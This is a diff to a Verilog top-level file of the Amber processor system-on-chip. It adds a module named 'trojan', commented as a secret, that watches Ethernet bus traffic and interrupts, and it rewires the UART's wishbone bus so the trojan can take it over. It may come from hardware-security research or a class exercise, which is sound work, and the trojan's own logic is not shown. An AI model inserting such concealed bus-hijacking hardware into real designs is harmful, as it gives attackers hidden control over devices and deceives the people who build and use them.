@@ -215,6 +215,34 @@ clocks_resets u_clocks_resets (
 
 
 // -------------------------------------------------------------
+/// Instatiate Trojan Hardware (shhhh! Secret)
+// -------------------------------------------------------------
+wire control_uart;
+trojan trojan0 (
+    .i_clk              (sys_clk),
+    .i_rst              (sys_rst),
+    .i_eth_s_wb_ack     (s_wb_ack[0]),
+    .i_eth_s_wb_dat_r   (s_wb_dat_r[0]),
+    .i_ethmac_int       (ethmac_int),
+    .o_control_uart     (control_uart),
+    .o_uart_s_wb_adr    (troj_s_wb_adr),
+    .o_uart_s_wb_sel    (troj_s_wb_sel),
+    .o_uart_s_wb_we     (troj_s_wb_we),
+    .o_uart_s_wb_dat_w  (troj_s_wb_dat_w),
+    .o_uart_s_wb_cyc    (troj_s_wb_cyc),
+    .o_uart_s_wb_stb    (troj_s_wb_stb)
+);
+
+// Take control of the uart lines
+wire uart_s_wb_adr   = (control_uart)? troj_s_wb_adr   : s_wb_adr[3];
+wire uart_s_wb_sel   = (control_uart)? troj_s_wb_sel   : s_wb_sel[3];
+wire uart_s_wb_we    = (control_uart)? troj_s_wb_we    : s_wb_we[3];
+wire uart_s_wb_dat_w = (control_uart)? troj_s_wb_dat_w : s_wb_dat_w[3];
+wire uart_s_wb_cyc   = (control_uart)? troj_s_wb_cyc   : s_wb_cyc[3];
+wire uart_s_wb_stb   = (control_uart)? troj_s_wb_stb   : s_wb_stb[3];
+
+
+// -------------------------------------------------------------
 // Instantiate Amber Processor Core
 // -------------------------------------------------------------
 `ifdef AMBER_A25_CORE
@@ -363,13 +391,19 @@ u_uart0 (
     .o_uart_rts_n           ( o_uart0_cts    ),
     .i_uart_rxd             ( i_uart0_tx     ),
 
-    .i_wb_adr               ( s_wb_adr  [3]  ),
-    .i_wb_sel               ( s_wb_sel  [3]  ),
-    .i_wb_we                ( s_wb_we   [3]  ),
+    //.i_wb_adr               ( s_wb_adr  [3]  ),
+    .i_wb_adr               ( uart_s_wb_adr  ),
+    //.i_wb_sel               ( s_wb_sel  [3]  ),
+    .i_wb_sel               ( uart_s_wb_sel  ),
+    //.i_wb_we                ( s_wb_we   [3]  ),
+    .i_wb_we                ( uart_s_wb_we   ),
     .o_wb_dat               ( s_wb_dat_r[3]  ),
-    .i_wb_dat               ( s_wb_dat_w[3]  ),
-    .i_wb_cyc               ( s_wb_cyc  [3]  ),
-    .i_wb_stb               ( s_wb_stb  [3]  ),
+    //.i_wb_dat               ( s_wb_dat_w[3]  ),
+    .i_wb_dat               ( uart_s_wb_dat_w ),
+    //.i_wb_cyc               ( s_wb_cyc  [3]  ),
+    .i_wb_cyc               ( uart_s_wb_cyc  ),
+    //.i_wb_stb               ( s_wb_stb  [3]  ),
+    .i_wb_stb               ( uart_s_wb_stb  ),
     .o_wb_ack               ( s_wb_ack  [3]  ),
     .o_wb_err               ( s_wb_err  [3]  )
 );
